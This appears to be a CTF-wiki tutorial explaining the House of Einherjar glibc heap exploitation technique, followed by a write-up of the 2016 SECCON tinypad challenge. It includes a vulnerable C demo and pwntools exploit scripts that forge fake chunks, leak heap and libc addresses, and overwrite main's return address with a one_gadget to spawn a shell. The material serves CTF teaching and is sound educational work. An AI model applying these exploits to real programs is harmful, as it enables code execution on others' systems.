#  House Of Einherjar

## Introduction

House of Einherjar is a heap exploitation technique proposed by `Hiroki Matsukuma`. This heap exploitation technique can force `malloc` to return a chunk at an almost arbitrary address. It mainly abuses the backward consolidation operation in `free` (consolidating chunks at lower addresses), in order to avoid fragmentation as much as possible.

Additionally, it should be noted that for certain special sizes of heap blocks, off by one can not only modify the next heap block's prev_size, but also modify the next heap block's PREV_INUSE bit.

## Principle

### Backward Consolidation Operation

The core operation of backward consolidation in the `free` function is as follows:

```c
        /* consolidate backward */
        if (!prev_inuse(p)) {
            prevsize = prev_size(p);
            size += prevsize;
            p = chunk_at_offset(p, -((long) prevsize));
            unlink(av, p, bck, fwd);
        }
```

Here we borrow a diagram from the original author to illustrate:

![](./figure/backward_consolidate.png)

For the overall operation, please refer to the chapter on `Understanding Heap Implementation in Depth`.

### Exploitation Principle

Here we introduce the principle of this exploitation. First, from the previous introduction to the heap, we can know the following:

- Two physically adjacent chunks share the `prev_size` field, especially when the lower-addressed chunk is in use, the higher-addressed chunk's field can be used by the lower-addressed chunk. Therefore, there is hope that we can overwrite the higher-addressed chunk's `prev_size` field by writing to the lower-addressed chunk.
- A chunk's PREV_INUSE bit marks the usage state of its physically adjacent lower-addressed chunk, and this bit is physically adjacent to prev_size.
- During backward consolidation, the position of the new chunk depends on `chunk_at_offset(p, -((long) prevsize))`.

**So if we can simultaneously control a chunk's prev_size and PREV_INUSE fields, then we can point the new chunk to almost any location.**

### Exploitation Process

#### Before Overflow

Assume the state before overflow is as follows:

![](./figure/einherjar_before_overflow.png)

#### Overflow

Here we assume that the p0 heap block can write to the prev_size field on one hand, and on the other hand, has an off by one vulnerability that can write to the next chunk's PREV_INUSE part, then:

![](./figure/einherjar_overflowing.png)

#### After Overflow

**Assume we set p1's prev_size field to the difference between our desired target chunk location and p1**. After the overflow, when we free p1, the position of the new chunk `chunk_at_offset(p1, -((long) prevsize))` will be the chunk location we want.

Of course, it should be noted that since unlink will be performed on the new chunk here, we need to ensure that a fake chunk is properly constructed at the corresponding chunk location to bypass unlink detection.

![](./figure/einherjar_after_overflow.png)

### Attack Process Example

Code that can perform the House Of Einherjar attack:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void){
    char* s0 = malloc(0x200);　// Construct fake chunk
    char* s1 = malloc(0x18);
    char* s2 = malloc(0xf0);　
    char* s3 = malloc(0x20); // To prevent s2 from merging with top chunk
    printf("begin\n");
    printf("%p\n", s0);
    printf("input s0\n");
    read(0, s0, 0x200); // Read in fake chunk
    printf("input s1\n");
    read(0, s1, 0x19); // Off By One
    free(s2);
    return 0;
}
```

The attack code is as follows:

```python
from pwn import *

p = process("./example")
context.log_level = 'debug'
#gdb.attach(p)
p.recvuntil("begin\n")
address = int(p.recvline().strip(), 16)
p.recvuntil("input s0\n")
payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
'''
p64(address) * 2 is to bypass
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr ("corrupted double-linked list");
'''
payload += p64(0x100) #fake size
p.sendline(payload)
p.recvuntil("input s1\n")
payload = "A"*0x10 + p64(0x220) + "\x00"
p.sendline(payload)
p.recvall()
p.close()
```

**Note that the method to bypass the unlink check here is different from the method used when exploiting the unlink vulnerability previously**

When exploiting the unlink vulnerability:

```c
 p->fd = &p-3*4
 p->bk = &p-2*4
```

When exploiting here, because there is no way to find `&p`, we directly let:

```c
p->fd = p
p->bk = p
```

**There is a point to note here:**

```python
payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
```

Actually, modifying it to the following also works:

```python
payload = p64(0) + p64(0x221) + p64(address) * 2 + "A"*0xe0
```

Logically, the fake chunk's size should be `0x221`, but why does `0x101` also work? This is because the verification of size and prev_size only occurs in unlink, and unlink verifies it like this:

```c
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");
```

So we only need to also forge the prev_size field of the fake chunk's next chunk.

### Summary

Here we summarize the points to note about this exploitation technique:

- There needs to be an overflow vulnerability that can write to the physically adjacent higher-addressed prev_size and PREV_INUSE parts.
- We need to calculate the difference between the target chunk and the p1 address, so address leaking is required.
- We need to construct a corresponding fake chunk near the target chunk to bypass unlink detection.


Actually, this technique is quite similar to the chunk extend/shrink technique.


## 2016 Seccon tinypad
[Challenge Link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/house-of-einherjar/2016_seccon_tinypad)

### Basic Function Analysis

First, we can see that the program relies on a core read function, which reads a string of specified length. However, when the read length is exactly the specified length, an **off by one vulnerability** occurs.

Through analyzing the program, we can easily see that the basic function of this program is to operate a tinypad, with the following main operations:

- At the beginning, the program checks each memo's pointer sequentially to determine if it's empty. If not empty, it uses strlen to get the corresponding length and outputs the memo's content. From this, we can also see that there are at most 4 memos.
- Add memo: traverse the variable tinypad that stores memos, determine whether a memo is in use based on the stored size in tinypad, then allocate a memo if space is available. From this we can know that the program only starts using from tinypad's starting offset of 16*16=256 bytes. Each memo stores two fields: the size of the memo and the pointer to the memo. So we can create a new structure and modify the tinypad recognized by IDA to make it more readable (but IDA actually cannot help with intelligent recognition). At the same time, since the add function relies on the read function, there is an off by one vulnerability. Additionally, we can see that the maximum chunk size a user can request is 256 bytes, which is exactly consistent with the unused 256 bytes at the front of tinypad.
- Delete: determine whether a memo is in use based on the stored memo size, and set the corresponding memo size to 0, but the pointer is not set to NULL, which may lead to Use After Free. **That is, at the beginning of the program, some related content may be output, which is actually the basis for leaking some base addresses**.
- Edit: When editing, the program first copies the previously stored memo content to the first 256 bytes of tinypad. But as we said before, when the memo stores 256 bytes, there will be an off by one vulnerability. At the same time, the program uses strlen to determine the content length of tinypad after copying, and outputs it. Then the program continues to use strlen to get the memo's length and reads content of the specified length into tinypad. According to the read function, there will inevitably be a `\x00` here. Finally, the program puts the content read into the first 256 bytes of tinypad into the corresponding memo.
- Exit

### Exploitation

The basic exploitation strategy is as follows:

1. Use the UAF vulnerability where the pointer is not set to NULL during deletion to leak the heap base address
2. Use the UAF vulnerability again to leak the libc base address.
3. Use the house of einherjar method to forge a chunk in the first 256 bytes of tinypad. When we allocate again, we can control the pointers and contents of all 4 memos.
4. Although our first thought might be to directly overwrite malloc_hook with the one_gadget address, since the program uses strlen to determine how many bytes can be read during editing, and malloc_hook is initially 0, we cannot directly overwrite it. So we use another method here: modify the return address of the main function to one_gadget. The reason this works is that the return address usually starts with 7f, which is long enough to be overwritten with one_gadget. So we still need to leak the return address of the main function. Since libc stores the address of main function's environ pointer, we can first leak the environ address, then obtain the address where the main function's return address is stored. The environ symbol is chosen here because the environ symbol is exported in libc, while argc and argv are not exported, which would be relatively more troublesome.
5. Finally, modify the main function's return address to the one_gadget address to get a shell.

The specific exploitation script is as follows:

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
tinypad = ELF("./tinypad")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
    libc = ELF('./libc.so.6')
else:
    p = process("./tinypad")
    libc = ELF('./libc.so.6')
    main_arena_offset = 0x3c4b20
log.info('PID: ' + str(proc.pidof(p)[0]))


def add(size, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('a')
    p.recvuntil('(SIZE)>>> ')
    p.sendline(str(size))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)


def edit(idx, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('e')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil('Is it OK?\n')
    p.sendline('Y')


def delete(idx):
    p.recvuntil('(CMD)>>> ')
    p.sendline('d')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))


def run():
    p.recvuntil(
        '  ============================================================================\n\n'
    )
    # 1. leak heap base
    add(0x70, 'a' * 8)  # idx 0
    add(0x70, 'b' * 8)  # idx 1
    add(0x100, 'c' * 8)  # idx 2

    delete(2)  # delete idx 1
    delete(1)  # delete idx 0, idx 0 point to idx 1
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)  # get pointer point to idx1
    heap_base = u64(data.ljust(8, '\x00')) - 0x80
    log.success('get heap base: ' + hex(heap_base))

    # 2. leak libc base
    # this will trigger malloc_consolidate
    # first idx0 will go to unsorted bin
    # second idx1 will merge with idx0(unlink), and point to idx0
    # third idx1 will merge into top chunk
    # but cause unlink feture, the idx0's fd and bk won't change
    # so idx0 will leak the unsorted bin addr
    delete(3)
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)
    unsorted_offset_arena = 8 + 10 * 8
    main_arena = u64(data.ljust(8, '\x00')) - unsorted_offset_arena
    libc_base = main_arena - main_arena_offset
    log.success('main arena addr: ' + hex(main_arena))
    log.success('libc base addr: ' + hex(libc_base))

    # 3. house of einherjar
    add(0x18, 'a' * 0x18)  # idx 0
    # we would like trigger house of einherjar at idx 1
    add(0x100, 'b' * 0xf8 + '\x11')  # idx 1
    add(0x100, 'c' * 0xf8)  # idx 2
    add(0x100, 'd' * 0xf8)  #idx 3

    # create a fake chunk in tinypad's 0x100 buffer, offset 0x20
    tinypad_addr = 0x602040
    fakechunk_addr = tinypad_addr + 0x20
    fakechunk_size = 0x101
    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(
        fakechunk_addr)
    edit(3, 'd' * 0x20 + fakechunk)

    # overwrite idx 1's prev_size and
    # set minaddr of size to '\x00'
    # idx 0's chunk size is 0x20
    diff = heap_base + 0x20 - fakechunk_addr
    log.info('diff between idx1 and fakechunk: ' + hex(diff))
    # '\0' padding caused by strcpy
    diff_strip = p64(diff).strip('\0')
    number_of_zeros = len(p64(diff)) - len(diff_strip)
    for i in range(number_of_zeros + 1):
        data = diff_strip.rjust(0x18 - i, 'f')
        edit(1, data)
    delete(2)
    p.recvuntil('\nDeleted.')

    # fix the fake chunk size, fd and bk
    # fd and bk must be unsorted bin
    edit(4, 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) +
         p64(main_arena + 88))

    # 3. overwrite malloc_hook with one_gadget

    one_gadget_addr = libc_base + 0x45216
    environ_pointer = libc_base + libc.symbols['__environ']
    log.info('one gadget addr: ' + hex(one_gadget_addr))
    log.info('environ pointer addr: ' + hex(environ_pointer))
    #fake_malloc_chunk = main_arena - 60 + 9
    # set memo[0].size = 'a'*8,
    # set memo[0].content point to environ to leak environ addr
    fake_pad = 'f' * (0x100 - 0x20 - 0x10) + 'a' * 8 + p64(
        environ_pointer) + 'a' * 8 + p64(0x602148)
    # get a fake chunk
    add(0x100 - 8, fake_pad)  # idx 2
    #gdb.attach(p)

    # get environ addr
    p.recvuntil(' # CONTENT: ')
    environ_addr = p.recvuntil('\n', drop=True).ljust(8, '\x00')
    environ_addr = u64(environ_addr)
    main_ret_addr = environ_addr - 30 * 8

    # set memo[0].content point to main_ret_addr
    edit(2, p64(main_ret_addr))
    # overwrite main_ret_addr with one_gadget addr
    edit(1, p64(one_gadget_addr))
    p.interactive()


if __name__ == "__main__":
    run()
```



## References

- https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606
- https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf
- https://bbs.pediy.com/thread-226119.htm
